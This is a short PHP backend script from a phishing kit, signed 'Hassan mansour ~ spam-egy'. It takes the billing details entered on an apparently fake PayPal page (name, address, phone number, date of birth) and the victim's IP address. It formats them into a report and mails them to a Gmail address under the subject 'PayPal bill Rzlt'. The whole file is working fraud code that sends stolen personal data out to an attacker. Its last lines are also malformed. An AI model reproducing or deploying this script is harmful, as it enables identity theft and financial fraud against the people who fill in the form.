﻿<?

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$lboss1 = $_POST['fn'];
$lboss2 = $_POST['ln'];
$lboss3 = $_POST['add1'];
$lboss4 = $_POST['add2'];
$lboss5 = $_POST['city'];
$lboss6 = $_POST['state'];
$lboss7 = $_POST['contry'];
$lboss8 = $_POST['pcode'];
$lboss9 = $_POST['phone'];
$lboss10 = $_POST['bday'];
$lboss11 = $_POST['bmonth'];
$lboss12 = $_POST['byear'];

$message .="
||===========|Hassan mansour ~ spam-egy |========||
||======================+ BILLING INFO +====================||
||f name        :  ".$lboss1."
||last name     : ".$lboss2."
||addrs1        : ".$lboss3."
||addrs2        : ".$lboss4."
||city          : ".$lboss5."
||state         : ".$lboss6."
||contry        : ".$lboss7."
||post_code     : ".$lboss8."
||phone         : ".$lboss9."
||milado        : ".$lboss10." ".$lboss11." ".$lboss12."



||====================== 	PC-INFO ====================||
||Date / time	    : $date
||Client IP         : http://www.geoiptool.com/?IP=$ip
||=========||Hassan mansour ~ spam-egy |=====================||\n";

$cabeceras  = 'MIME-Version: 1.0' . "\r\n";  //------------------------------------------------------------------------------|
$cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; //-----------------------------------------------------|
$send="alouani987@gmail.com";
$sp1 = "PayPal bill Rzlt | $ip";
mail($send,$sp1,$message,$cabeceras);

fwrite($message); 
href="http://www.apple.com/uk/ipad/"
?>
